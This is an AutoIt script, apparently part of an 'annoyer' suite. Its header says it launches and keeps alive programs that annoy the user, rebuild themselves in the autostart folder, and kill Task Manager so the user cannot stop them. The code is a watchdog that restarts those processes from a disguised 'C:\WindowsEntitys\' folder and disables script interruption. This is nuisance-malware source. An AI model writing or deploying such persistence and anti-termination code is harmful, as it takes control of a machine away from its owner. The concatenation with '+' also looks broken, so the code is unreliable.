#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.2
 Author:         myName

 Script Function:
	Template AutoIt script.
   Sccdt
   Start caip , coc , DoAnoy , and taskmgrCloser


This Script is used to start all the other scripts in order to anoy the user, and also protect the script of beeing deleted or stopped via taskMgr.
Including:

CeckAndInstallPath (caip.exe= -> cheking if path of all scripts exists. if not it "rebuilds" them (especially in autostart folder)
																								   -> a right password will uninstall the annoyer COMPLETELY
close operation checker (coc.exe) checks wether the hotkey for closing the script is typed or not. -> closes every script if password is OK

DoAnoy.exe -> annoys the user

taskmgrCloser.exe -> checks if the taskmgr is called. if so, imediatly closes the process.



THIS DATA HAS TO BE PUT INSIDE THE REGISTRY AND OR AUTOSTART


#ce ----------------------------------------------------------------------------
;#NoTrayIcon
Break(0);
$pathCreateDest = "C:\WindowsEntitys\"

Func _chekProcessExists($proccessname)
   If Not ProcessExists($proccessname) Then
	  Run($pathCreateDest + $proccessname);
	  ProcessWait($proccessname);
   EndIf
   sleep(10);
EndFunc
 _chekProcessExists("DoAnoy.exe");
 _chekProcessExists("taskmgrCloser.exe");
 _chekProcessExists("caip.exe");
 _chekProcessExists("coc.exe");
